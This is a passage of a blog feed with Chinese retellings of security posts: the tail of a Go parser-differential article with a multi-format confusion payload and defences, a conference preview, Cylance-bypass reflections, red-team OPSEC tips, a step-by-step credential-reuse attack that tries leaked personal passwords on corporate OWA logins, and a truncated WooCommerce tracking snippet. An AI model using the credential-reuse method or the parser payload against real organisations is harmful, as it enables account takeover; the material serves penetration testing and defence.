&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;#34;comment&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;action&amp;gt;Action_3&amp;lt;/action&amp;gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;该payload会：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;JSON解析为&lt;code&gt;Action_2&lt;/code&gt;（取最后匹配+大小写不敏感）&lt;/li&gt;
&lt;li&gt;YAML解析为&lt;code&gt;Action_1&lt;/code&gt;（精确匹配）&lt;/li&gt;
&lt;li&gt;XML解析为&lt;code&gt;Action_3&lt;/code&gt;（提取XML片段）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;防护建议&#34;&gt;防护建议
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;启用严格模式&lt;/strong&gt;：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;decoder&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;NewDecoder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;reader&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;decoder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;DisallowUnknownFields&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;期待JSON v2&lt;/strong&gt;：将默认禁止重复键并启用大小写敏感匹配&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;边界一致性检查&lt;/strong&gt;：跨服务处理时验证数据格式一致性&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;使用静态分析&lt;/strong&gt;：我们提供的Semgrep规则可检测常见错误配置&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这些解析器特性已导致真实漏洞，包括Hashicorp Vault认证绕过(CVE-2020-16250)等案例。开发者需要特别警惕大小写不敏感匹配这类Go特有行为。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>四月渗透季 - Trail of Bits博客聚焦二进制分析与漏洞研究</title>
        <link>http://localhost:1313/p/%E5%9B%9B%E6%9C%88%E6%B8%97%E9%80%8F%E5%AD%A3-trail-of-bits%E5%8D%9A%E5%AE%A2%E8%81%9A%E7%84%A6%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</link>
        <pubDate>Fri, 01 Aug 2025 21:58:00 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%9B%9B%E6%9C%88%E6%B8%97%E9%80%8F%E5%AD%A3-trail-of-bits%E5%8D%9A%E5%AE%A2%E8%81%9A%E7%84%A6%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</guid>
        <description>&lt;h2 id=&#34;突破传统黑客极限&#34;&gt;突破传统黑客极限
&lt;/h2&gt;&lt;p&gt;穿上你的瓜亚贝拉衬衫，Infiltrate盛会即将开启。Trail of Bits自2015年起持续赞助并全员参与这一顶尖会议（今年多达18人！）。除了交换纪念品，我们更期待见证最新安全研究成果——包括我们自己的突破性贡献。&lt;/p&gt;
&lt;h2 id=&#34;技术亮点前瞻&#34;&gt;技术亮点前瞻
&lt;/h2&gt;&lt;h3 id=&#34;二进制摇滚明星进阶&#34;&gt;二进制摇滚明星进阶
&lt;/h3&gt;&lt;p&gt;Sophia d&amp;rsquo;Antoine将联合Binary Ninja开发者呈现《成为二进制摇滚明星：漏洞研究中的高阶静态分析》，基于其先前将抽象解释引入Binary Ninja的研究成果进行深度扩展。&lt;/p&gt;
&lt;h3 id=&#34;manticore实战体验&#34;&gt;Manticore实战体验
&lt;/h3&gt;&lt;p&gt;我们将展示CGC机器人的核心——&lt;strong&gt;Manticore二进制符号执行引擎&lt;/strong&gt;（支持x86/x86-64/ARM架构）。参会者可通过解决挑战任务提前体验这一即将开源的工具，并赢取专属马克杯。&lt;/p&gt;
&lt;h2 id=&#34;往届技术回眸&#34;&gt;往届技术回眸
&lt;/h2&gt;&lt;p&gt;2016年我们曾分享：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;《构建可扩展的自动化黑客系统》&lt;/li&gt;
&lt;li&gt;《Swift逆向工程实践》&lt;/li&gt;
&lt;li&gt;NOP认证竞赛中与ImmunityDbg的激烈对抗（7分33秒弹出计算器）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;本届重磅议题&#34;&gt;本届重磅议题
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Justin Schuh：《四面楚歌：防御战壕中的现实视角》&lt;/li&gt;
&lt;li&gt;Vasilis团队：《安卓libc分配器的堆利用辅助技术》&lt;/li&gt;
&lt;li&gt;Jean-Philippe：《Signal应用漏洞狩猎》&lt;/li&gt;
&lt;li&gt;Ralf-Phillip：《基带处理器中的shellcode踪迹》&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;会议独特价值&#34;&gt;会议独特价值
&lt;/h2&gt;&lt;p&gt;Infiltrate以浓缩顶级会议精华内容著称，其特色包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;与演讲者/顶尖研究者的深度交流（&amp;ldquo;强力大厅会议&amp;quot;文化）&lt;/li&gt;
&lt;li&gt;全包式优质餐饮活动&lt;/li&gt;
&lt;li&gt;严禁无票蹭会（笑）&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;拉斯维加斯已成过往，真正的盛宴在迈阿密&amp;rdquo;——我们现场见！&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;em&gt;本文提及的所有技术工具与研究均可在Trail of Bits开源项目库中找到对应实现。&lt;/em&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>绕过Cylance防护：第五部分 - 未来展望</title>
        <link>http://localhost:1313/p/%E7%BB%95%E8%BF%87cylance%E9%98%B2%E6%8A%A4%E7%AC%AC%E4%BA%94%E9%83%A8%E5%88%86-%E6%9C%AA%E6%9D%A5%E5%B1%95%E6%9C%9B/</link>
        <pubDate>Fri, 01 Aug 2025 21:50:47 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E7%BB%95%E8%BF%87cylance%E9%98%B2%E6%8A%A4%E7%AC%AC%E4%BA%94%E9%83%A8%E5%88%86-%E6%9C%AA%E6%9D%A5%E5%B1%95%E6%9C%9B/</guid>
        <description>&lt;p&gt;我们刚刚完成了在前期项目中绕过Cylance防护的全过程演示。作为这个精彩系列的收官之作，我想分享几点关键观察。&lt;/p&gt;
&lt;p&gt;首先需要明确，作为渗透测试团队，我们只测试客户实际部署的环境，而非厂商指定的理想配置。尽管使用的技术非常基础（例如简单的脚本混淆和载荷拆分），但这些方法确实有效突破了防护——这本身就值得反思反病毒厂商的宣传话术。&lt;/p&gt;
&lt;p&gt;关于测试权限的争议值得关注。Cylance与CrowdStrike等厂商在用户协议中严格限制第三方测试的行为，这就像汽车厂商禁止媒体评测其产品般荒谬。必须说明的是，Cylance相比传统黑名单反病毒已有显著进步——在我们的测试中，它对某些高级威胁的检测确实展现了优势。&lt;/p&gt;
&lt;p&gt;白名单技术讨论是核心议题。虽然启用应用白名单（如通过AppLocker或SRP）能阻断我们90%的攻击路径，但这并非某个厂商的专利功能。问题在于企业往往因运维成本放弃启用这些功能，而厂商将未启用增强功能作为检测失败的借口并不合理。&lt;/p&gt;
&lt;p&gt;行业现状令人担忧：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;安全产品评测缺乏客观性（如NSS Labs报告存在明显缺陷）&lt;/li&gt;
&lt;li&gt;不存在&amp;quot;银弹&amp;quot;解决方案——Cylance宣称的AI预测攻击能力尚未经实践验证&lt;/li&gt;
&lt;li&gt;真正的安全需要架构级解决方案，包括应用白名单和出口流量管控&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;最后必须强调：部署任何高级端点防护产品都不是简单的&amp;quot;轻松按钮&amp;quot;。实施过程需要专业团队持续维护，否则防护效果将大打折扣。&lt;/p&gt;
&lt;p&gt;致谢：本系列技术实现基于Casey Smith和@_TacoRocket的前沿研究，推荐阅读Colby Farley的博客（https://pwningroot.com/）获取更多绕过技巧。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>远程红队行动安全基础 - 操作安全核心要点解析</title>
        <link>http://localhost:1313/p/%E8%BF%9C%E7%A8%8B%E7%BA%A2%E9%98%9F%E8%A1%8C%E5%8A%A8%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-%E6%93%8D%E4%BD%9C%E5%AE%89%E5%85%A8%E6%A0%B8%E5%BF%83%E8%A6%81%E7%82%B9%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Fri, 01 Aug 2025 21:44:07 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E8%BF%9C%E7%A8%8B%E7%BA%A2%E9%98%9F%E8%A1%8C%E5%8A%A8%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-%E6%93%8D%E4%BD%9C%E5%AE%89%E5%85%A8%E6%A0%B8%E5%BF%83%E8%A6%81%E7%82%B9%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;红队行动中的数据泄露挑战&#34;&gt;红队行动中的数据泄露挑战
&lt;/h3&gt;&lt;p&gt;在远程红队演练中，与目标网站的每次交互、发送的每封邮件、探测的每个网络服务都会留下可追溯痕迹。成熟的蓝队能够通过信息关联识别红队行为，进而实施阻断或部署反制措施。&lt;/p&gt;
&lt;h3 id=&#34;技术对抗要点&#34;&gt;技术对抗要点
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;泄露源头控制&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;工作站本地配置（0:40:42）&lt;/li&gt;
&lt;li&gt;操作系统级修改（0:45:01）&lt;/li&gt;
&lt;li&gt;工具特征伪装（0:49:44）&lt;/li&gt;
&lt;li&gt;源IP地址保护体系（0:56:35）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;基础设施架构&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;故障保护型VPN部署（1:01:36）&lt;/li&gt;
&lt;li&gt;第三方服务风险隔离（1:02:57）&lt;/li&gt;
&lt;li&gt;网络服务指纹混淆（1:10:05）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;标准化流程建设&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;新工具测试方法论（1:15:19）&lt;/li&gt;
&lt;li&gt;防御视角的OPSEC评估框架（0:38:06）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;技术实现路径&#34;&gt;技术实现路径
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;通过系统级修改消除工具特征（如修改C2通信指纹）&lt;/li&gt;
&lt;li&gt;构建多跳代理架构实现IP地址保护&lt;/li&gt;
&lt;li&gt;建立工具测试沙箱环境验证可检测性&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;红队必须像防御者一样思考，这种思维模式能适应未来新型工具的安防对抗&amp;rdquo; —— Michael Allen（持有OSCE/MLSE/CISSP认证）&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.blackhillsinfosec.com/wp-content/uploads/2021/03/SLIDES_OPSECFundamentalsRemoteRedTeams-1.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;完整技术幻灯片下载&lt;/a&gt;&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;https://discord.gg/bhis&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;加入BHIS技术社区&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>利用个人账户密码重复问题获取域凭证：无需接入目标网络的攻击方法（第一部分）</title>
        <link>http://localhost:1313/p/%E5%88%A9%E7%94%A8%E4%B8%AA%E4%BA%BA%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E5%A4%8D%E9%97%AE%E9%A2%98%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%87%AD%E8%AF%81%E6%97%A0%E9%9C%80%E6%8E%A5%E5%85%A5%E7%9B%AE%E6%A0%87%E7%BD%91%E7%BB%9C%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/</link>
        <pubDate>Fri, 01 Aug 2025 21:37:19 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%88%A9%E7%94%A8%E4%B8%AA%E4%BA%BA%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E5%A4%8D%E9%97%AE%E9%A2%98%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%87%AD%E8%AF%81%E6%97%A0%E9%9C%80%E6%8E%A5%E5%85%A5%E7%9B%AE%E6%A0%87%E7%BD%91%E7%BB%9C%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/</guid>
        <description>&lt;h1 id=&#34;利用个人账户密码重复问题获取域凭证无需接入目标网络的攻击方法第一部分&#34;&gt;利用个人账户密码重复问题获取域凭证：无需接入目标网络的攻击方法（第一部分）
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;作者：Beau Bullock&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在本系列文章中，我将详细介绍无需接入目标组织网络即可获取域用户凭证的多种方法。第一部分重点探讨如何利用员工在个人账户重复使用企业密码的行为；第二部分将介绍通过发现目标组织的用户名架构，并对外部服务（如Outlook Web Access门户）实施密码喷洒攻击的更复杂技术。&lt;/p&gt;
&lt;h2 id=&#34;本文不涉及便利贴密码问题&#34;&gt;本文不涉及便利贴密码问题
&lt;/h2&gt;&lt;h3 id=&#34;个人账户的凭证重用现象&#34;&gt;个人账户的凭证重用现象
&lt;/h3&gt;&lt;p&gt;用户在多个网络服务中重复使用相同密码是普遍存在的安全隐患。当某个网站遭到入侵时，若员工在个人账户和企业账户使用相同密码，攻击者获取个人凭证后即可间接获得企业账户访问权限。&lt;/p&gt;
&lt;h3 id=&#34;突破传统分析思路&#34;&gt;突破传统分析思路
&lt;/h3&gt;&lt;p&gt;常规的凭证泄露分析通常仅关注目标组织拥有的域名。更有效的方法是尝试定位企业员工在第三方服务中泄露的个人账户。当目标组织本身提供个人账户服务时（如Google员工可能拥有gmail.com账户），这种关联会变得更容易。&lt;/p&gt;
&lt;h3 id=&#34;实战案例从5万条泄露数据中定位员工凭证&#34;&gt;实战案例：从5万条泄露数据中定位员工凭证
&lt;/h3&gt;&lt;p&gt;在一次测试中，作者通过Pwnedlist.com发现目标组织的客户域名存在超过50,000个近期泄露账户。通过与组织沟通，确认员工可能使用这些&amp;quot;技术上的个人账户&amp;quot;。&lt;/p&gt;
&lt;p&gt;关键步骤：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用Pipl.com搜索引擎关联泄露邮箱与员工身份&lt;/li&gt;
&lt;li&gt;通过Burp Suite Intruder批量提交50,000个邮箱&lt;/li&gt;
&lt;li&gt;筛选包含目标公司名称的&amp;quot;Career&amp;quot;字段&lt;/li&gt;
&lt;li&gt;最终定位到252个疑似员工个人账户&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;凭证转换与验证&#34;&gt;凭证转换与验证
&lt;/h3&gt;&lt;p&gt;通过侦察获取企业邮箱命名规则（如firstname.lastname@格式）后：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;将个人账户信息转换为企业邮箱格式&lt;/li&gt;
&lt;li&gt;使用泄露的密码尝试登录企业外部门户（如OWA）&lt;/li&gt;
&lt;li&gt;成功访问重复使用密码的员工企业邮箱&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;攻击流程总结&#34;&gt;攻击流程总结
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;通过Pwnedlist等平台收集目标组织关联的个人账户泄露凭证&lt;/li&gt;
&lt;li&gt;使用Pipl验证账户持有人的雇主信息&lt;/li&gt;
&lt;li&gt;根据企业邮箱规则转换个人账户信息&lt;/li&gt;
&lt;li&gt;尝试凭证重用攻击&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;防御建议&#34;&gt;防御建议
&lt;/h2&gt;&lt;p&gt;推行密码管理工具，杜绝员工在多平台重复使用密码的行为。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;下篇将详细介绍如何通过发现用户名架构实施密码喷洒攻击。&lt;a class=&#34;link&#34; href=&#34;https://www.blackhillsinfosec.com/password-spraying-outlook-web-access/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;点击此处阅读第二部分&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>如何在WooCommerce感谢页面添加转化跟踪代码</title>
        <link>http://localhost:1313/p/%E5%A6%82%E4%BD%95%E5%9C%A8woocommerce%E6%84%9F%E8%B0%A2%E9%A1%B5%E9%9D%A2%E6%B7%BB%E5%8A%A0%E8%BD%AC%E5%8C%96%E8%B7%9F%E8%B8%AA%E4%BB%A3%E7%A0%81/</link>
        <pubDate>Fri, 01 Aug 2025 21:30:47 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%A6%82%E4%BD%95%E5%9C%A8woocommerce%E6%84%9F%E8%B0%A2%E9%A1%B5%E9%9D%A2%E6%B7%BB%E5%8A%A0%E8%BD%AC%E5%8C%96%E8%B7%9F%E8%B8%AA%E4%BB%A3%E7%A0%81/</guid>
        <description>&lt;h1 id=&#34;如何在woocommerce感谢页面添加转化跟踪代码&#34;&gt;如何在WooCommerce感谢页面添加转化跟踪代码
&lt;/h1&gt;&lt;p&gt;要将转化跟踪代码添加到WooCommerce感谢页面（以Google Ads为例），并动态插入订单值（如金额、货币、order_id），请在子主题的functions.php中使用以下代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;custom_conversion_tracking&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$order_id&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$order&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;wc_get_order&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$order_id&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    &amp;lt;script&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;      gtag(&amp;#34;event&amp;#34;, &amp;#34;conversion&amp;#34;, {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;          &amp;#34;send_to&amp;#34;: &amp;#34;Tracking-code-here-XXXXXXXXXX&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;          &amp;#34;value&amp;#34;: &amp;lt;?php echo $order-&amp;gt;get_total(); ?&amp;gt;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;          &amp;#34;currency&amp;#34;: &amp;#34;&amp;lt;?php echo $order-&amp;gt;get_currency(); ?&amp;gt;&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;          &amp;#34;transaction_id&amp;#34;: &amp;lt;?php echo $order_id; ?&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;      });
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    &amp;lt;/script&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    &amp;lt;?php
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;add_action( &amp;#39;woocommerce_thankyou&amp;#39;, &amp;#39;custom_conversion_tracking&amp;#39; );
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;如果要将代码添加到HEAD中，请使用：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;custom_conversion_tracking&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// 在order-received端点
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;is_wc_endpoint_url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;order-received&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// 获取订单ID
